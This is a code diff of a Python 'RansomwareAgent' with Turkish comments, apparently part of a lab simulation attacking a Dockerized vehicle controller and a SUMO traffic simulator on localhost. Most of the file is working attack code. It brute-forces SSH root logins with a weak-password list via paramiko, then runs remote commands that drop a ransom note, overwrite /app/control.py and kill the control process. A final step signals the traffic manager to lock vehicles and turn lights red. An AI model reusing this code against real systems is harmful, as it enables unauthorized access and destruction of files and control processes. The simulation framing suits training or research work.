@@ -1,7 +1,6 @@
 import socket
 import time
 
-# Basit SSH brute force için paramiko kullan
 try:
     import paramiko
     PARAMIKO_AVAILABLE = True
@@ -9,8 +8,6 @@ except ImportError:
     PARAMIKO_AVAILABLE = False
     print("⚠️  [RANSOMWARE] paramiko yüklü değil! pip install paramiko")
 
-
-# Fidye notu
 RANSOM_NOTE = """
 ╔══════════════════════════════════════════════════════════╗
 ║          !!!  UYARI: SİSTEM ŞİFRELENDİ  !!!             ║
@@ -26,22 +23,20 @@ RANSOM_NOTE = """
 ╚══════════════════════════════════════════════════════════╝
 """
 
-# Şifre listesi (zayıf şifreler)
 PASSWORD_LIST = [
     "1234", "admin", "password", "root", "123456",
     "toor", "qwerty", "letmein", "welcome", "test"
-]
+] # Simülasyon için basit bir parola listesi
 
 
 class RansomwareAgent:
     def __init__(self):
-        self.ssh_host = "localhost"
-        self.ssh_port = 2222          # docker-compose'da 2222:22 map edildi
-        self.username = "root"
+        self.ssh_host      = "localhost"
+        self.ssh_port      = 2222
+        self.username      = "root"
         self.found_password = None
 
     def check_ssh_open(self):
-        """Port 2222'de SSH servisi var mı kontrol et"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(2)
@@ -52,15 +47,13 @@ class RansomwareAgent:
             return False
 
     def brute_force_ssh(self):
-        """Şifre listesini dene, doğru şifreyi bul"""
         if not PARAMIKO_AVAILABLE:
-            print("❌ [RANSOMWARE] paramiko eksik, simüle ediliyor...")
-            # Simülasyon modu — paramiko yoksa direkt başarılı say
+            print("⚠️  [RANSOMWARE] Simülasyon modu (paramiko yok)...")
             self.found_password = "1234"
             return True
 
-        print(f"🔑 [RANSOMWARE] SSH Brute Force başlıyor: {self.ssh_host}:{self.ssh_port}")
-        print(f"🔑 [RANSOMWARE] Kullanıcı: {self.username} | {len(PASSWORD_LIST)} şifre denenecek")
+        print(f"🔑 [RANSOMWARE] SSH Brute Force: {self.ssh_host}:{self.ssh_port}")
+        print(f"🔑 [RANSOMWARE] {len(PASSWORD_LIST)} şifre denenecek...")
 
         for password in PASSWORD_LIST:
             try:
@@ -75,30 +68,26 @@ class RansomwareAgent:
                     timeout=3,
                     banner_timeout=5
                 )
-                # Bağlantı başarılı
                 self.found_password = password
                 client.close()
                 print(f"✅ [RANSOMWARE] ŞİFRE BULUNDU: {self.username}:{password}")
                 return True
-
             except paramiko.AuthenticationException:
-                pass  # Yanlış şifre, devam et
+                pass
             except Exception as e:
                 print(f"   [!] Bağlantı hatası: {e}")
                 time.sleep(0.5)
 
-        print("❌ [RANSOMWARE] Brute force başarısız, şifre bulunamadı.")
+        print("❌ [RANSOMWARE] Brute force başarısız.")
         return False
 
     def execute_ransomware_via_ssh(self):
-        """SSH ile sisteme gir, control.py'yi öldür, fidye notu bırak"""
         if not PARAMIKO_AVAILABLE:
-            print("⚠️  [RANSOMWARE] Simülasyon modu — komutlar simüle ediliyor")
             self._simulate_attack()
             return True
 
         try:
-            print(f"\n💀 [RANSOMWARE] SSH ile bağlanılıyor: {self.username}:{self.found_password}")
+            print(f"\n💀 [RANSOMWARE] SSH bağlanılıyor: {self.username}:{self.found_password}")
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             client.connect(
@@ -109,25 +98,28 @@ class RansomwareAgent:
                 timeout=5
             )
 
-            # Adım 1: control.py'yi öldür (pkill)
-            print("💀 [RANSOMWARE] Araç kontrol süreci sonlandırılıyor (pkill)...")
-            stdin, stdout, stderr = client.exec_command("pkill -f control.py")
-            time.sleep(1)
-            print("💀 [RANSOMWARE] control.py SONLANDIRILDI.")
-
-            # Adım 2: Fidye notunu sisteme bırak
+            # Adım 1: Fidye notunu bırak 
             print("📄 [RANSOMWARE] Fidye notu bırakılıyor...")
-            note_escaped = RANSOM_NOTE.replace('"', '\\"').replace('\n', '\\n')
-            cmd = f'echo "{note_escaped}" > /app/DOSYALARINIZ_SIFRELENDI.txt'
-            client.exec_command(cmd)
-            time.sleep(0.5)
+            note_content = RANSOM_NOTE.replace("'", "'\\''")  # bash escape
+            stdin, stdout, stderr = client.exec_command(
+                f"printf '%s' '{note_content}' > /app/DOSYALARINIZ_SIFRELENDI.txt"
+            )
+            stdout.channel.recv_exit_status()  # Komutun bitmesini bekle
             print("📄 [RANSOMWARE] Fidye notu bırakıldı: /app/DOSYALARINIZ_SIFRELENDI.txt")
 
-            # Adım 3: Kritik dosyaları "kilitle" (içeriğini değiştir)
+            # Adım 2: control.py'yi şifrele (üzerine yaz)
             print("🔒 [RANSOMWARE] Kritik dosyalar şifreleniyor...")
-            client.exec_command('echo "ENCRYPTED_BY_RANSOMWARE" > /app/control.py')
-            time.sleep(0.5)
-            print("🔒 [RANSOMWARE] control.py şifrelendi (üzerine yazıldı).")
+            stdin, stdout, stderr = client.exec_command(
+                "echo 'ENCRYPTED_BY_RANSOMWARE_VEH-2026-CTRL-4421' > /app/control.py"
+            )
+            stdout.channel.recv_exit_status()
+            print("🔒 [RANSOMWARE] control.py şifrelendi.")
+
+            # Adım 3: pkill — EN SON yap (oturumu kapatır)
+            print("💀 [RANSOMWARE] Araç kontrol süreci sonlandırılıyor (pkill)...")
+            client.exec_command("pkill -f control.py")
+            time.sleep(1)
+            print("💀 [RANSOMWARE] control.py SONLANDIRILDI.")
 
             client.close()
             return True
@@ -137,47 +129,60 @@ class RansomwareAgent:
             return False
 
     def _simulate_attack(self):
-        """paramiko yoksa görsel simülasyon"""
-        print("💀 [RANSOMWARE] [SİMÜLASYON] SSH bağlantısı kuruldu: root:1234")
-        time.sleep(0.5)
-        print("💀 [RANSOMWARE] [SİMÜLASYON] pkill -f control.py → çalıştırıldı")
+        print("💀 [RANSOMWARE] [SİMÜLASYON] SSH bağlantısı: root:1234")
         time.sleep(0.5)
         print("📄 [RANSOMWARE] [SİMÜLASYON] Fidye notu bırakıldı")
         time.sleep(0.5)
         print("🔒 [RANSOMWARE] [SİMÜLASYON] Dosyalar şifrelendi")
+        time.sleep(0.5)
+        print("💀 [RANSOMWARE] [SİMÜLASYON] pkill control.py")
+
+    def notify_traffic_manager(self):
+        """SSH saldırısı bittikten sonra SUMO'ya da bildir — araçlar mor olsun"""
+        import socket as _socket
+        try:
+            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect(("localhost", 9999))
+            sock.sendall(b"RANSOMWARE")
+            sock.recv(1024)
+            sock.close()
+            print("🟣 [RANSOMWARE] SUMO bildirildi — araçlar kilitlendi, ışıklar kırmızıya alındı.")
+        except Exception as e:
+            print(f"⚠️  [RANSOMWARE] SUMO bildirimi başarısız (traffic_manager çalışıyor mu?): {e}")
 
     def run(self, blackboard):
-        """Ajanın ana çalışma fonksiyonu"""
-        state = blackboard.read_state()
-
         print("\n" + "=" * 60)
         print("💀 [RANSOMWARE AJANI] SALDIRI BAŞLIYOR")
         print("=" * 60)
 
-        # Adım 1: SSH portu açık mı?
+        # SSH portunu kontrol et — açık değilse başarısız say
         print(f"\n🔍 [RANSOMWARE] SSH port kontrolü: {self.ssh_host}:{self.ssh_port}")
         if not self.check_ssh_open():
-            print(f"❌ [RANSOMWARE] Port {self.ssh_port} kapalı! vehicle_controller çalışıyor mu?")
+            print(f"❌ [RANSOMWARE] Port {self.ssh_port} kapalı!")
             blackboard.update_key("mission_status", "FAIL")
             return
 
         print(f"✅ [RANSOMWARE] SSH portu açık!")
         blackboard.update_key("vulnerabilities", ["SSH_OPEN_WEAK_PASSWORD"])
 
-        # Adım 2: Brute force
+        # Brute force ile şifreyi bul
         if not self.brute_force_ssh():
             blackboard.update_key("mission_status", "FAIL")
             return
 
-        # Adım 3: Ransomware uygula
+        # Saldırıyı uygula
         success = self.execute_ransomware_via_ssh()
 
         if success:
+            # SUMO'ya da bildir — araçlar mor olsun, ışıklar kırmızıya dönsün
+            self.notify_traffic_manager()
+
             print("\n" + "=" * 60)
             print("💀 [RANSOMWARE] SALDIRI TAMAMLANDI!")
             print(RANSOM_NOTE)
             print("=" * 60)
-            blackboard.update_key("logs", ["RANSOMWARE_DEPLOYED: vehicle_controller ele geçirildi."])
+            blackboard.update_key("logs", ["RANSOMWARE_DEPLOYED: vehicle_controller ele gecirildi."])
             blackboard.update_key("mission_status", "SUCCESS")
         else:
             blackboard.update_key("mission_status", "FAIL")
